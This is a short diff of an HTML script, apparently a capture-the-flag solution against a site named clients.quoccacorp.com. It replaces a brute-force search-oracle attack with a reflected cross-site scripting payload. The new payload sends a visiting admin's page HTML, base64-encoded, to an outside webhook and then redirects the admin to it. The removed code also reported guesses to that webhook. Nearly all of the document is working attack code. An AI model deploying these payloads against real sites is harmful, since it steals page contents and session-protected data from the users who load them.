@@ -1,27 +1,11 @@
 <script>
+    // 1. 定義你的 Webhook
     const WEBHOOK = "https://webhooksite.net/d0d97f98-91ad-4292-a927-e1382192f586";
-    const TARGET = "https://clients.quoccacorp.com/?q=";
     
-    // 從你已經知道的位數開始往後猜
-    async function crack(current) {
-        for (let i = 0; i <= 9; i++) {
-            let guess = current + i;
-            // 構造一個 URL，利用搜尋結果來判斷
-            // 這裡我們利用 window.open 的數量或時間差來做 Oracle
-            let url = `${TARGET}${guess}#:~:text=${guess}`;
-            let win = window.open(url);
-            
-            // 給瀏覽器一點時間加載
-            await new Promise(r => setTimeout(r, 500)); 
-            
-            // 這裡通常需要一個偵測機制，例如檢測 win.length 或是 focus
-            // 為了簡化，我們先讓它每一位都報備到 Webhook，你在後台看哪一串最長
-            fetch(`${WEBHOOK}?trying=${guess}`);
-            
-            if (win) win.close();
-        }
-    }
+    // 2. 構造一個直接偷取頁面內容的 XSS 網址
+    // 我們利用 btoa 把整個網頁 HTML 轉成 Base64，這樣 Flag 才不會因為特殊字元傳不出來
+    const exploitUrl = "https://clients.quoccacorp.com/?q=<script>fetch('" + WEBHOOK + "?data=' %2b btoa(document.body.innerHTML))<\/script>";
 
-    // 開始爆破！
-    crack("177"); 
+    // 3. 讓 Admin 訪問這個帶有 XSS 的網址
+    window.location.href = exploitUrl;
 </script>
